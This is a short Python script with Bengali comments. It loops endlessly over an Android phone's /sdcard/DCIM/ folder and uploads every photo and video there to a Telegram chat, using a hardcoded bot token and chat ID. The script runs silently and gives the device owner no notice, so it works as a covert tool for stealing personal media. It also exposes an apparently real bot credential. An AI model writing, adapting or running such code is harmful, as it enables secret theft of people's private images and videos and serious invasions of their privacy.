import os
import time
import requests

# তোমার টেলিগ্রাম বটের টোকেন  
BOT_TOKEN = "8031168268:AAHgNwZm4v5z68N9oVU4lKheOo66ysVhwqg"

# তোমার টেলিগ্রাম আইডি (যেখানে ফাইল পাঠাবে)
CHAT_ID = "7348506103"

# যে ফোল্ডারের ফাইল পাঠাবে (যেমন: /sdcard/DCIM/)
FOLDER_PATH = "/sdcard/DCIM/"

# আগে পাঠানো ফাইলগুলো ট্র্যাক করার জন্য একটি লিস্ট
sent_files = set()

# ফাইল আপলোড ফাংশন
def send_file(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, "rb") as file:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"document": file})
        print(f"📤 পাঠানো হয়েছে: {file_path}")

# লুপ চালু থাকবে
while True:
    for root, dirs, files in os.walk(FOLDER_PATH):  
        for file_name in files:
            file_path = os.path.join(root, file_name)

            # শুধুমাত্র ছবি ও ভিডিও ফাইল পাঠাবে
            if file_path.endswith((".jpg", ".jpeg", ".png", ".mp4", ".avi", ".mkv")) and file_path not in sent_files:
                send_file(file_path)
                sent_files.add(file_path)

    time.sleep(10)  # প্রতি ১০ সেকেন্ড পর পর চেক করবে
